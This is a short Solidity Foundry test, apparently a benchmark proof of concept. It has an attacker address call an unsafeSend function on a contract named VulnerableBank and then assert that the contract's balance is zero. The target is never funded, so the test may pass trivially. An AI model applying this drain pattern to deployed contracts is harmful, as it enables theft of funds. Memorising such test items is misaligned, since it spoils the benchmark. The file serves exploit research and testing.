// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/59211d84-c7b9-40c4-b46b-03384be2eb91_VulnerableBank.sol";

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address attacker = address(0xBAD);

    function setUp() public {
        target = new VulnerableBank();
        vm.deal(attacker, 10 ether);
    }

    function testExploit() public balanceLog {
        vm.prank(attacker);
        target.unsafeSend(payable(attacker), 0);
        assertEq(address(target).balance, 0);
    }
}
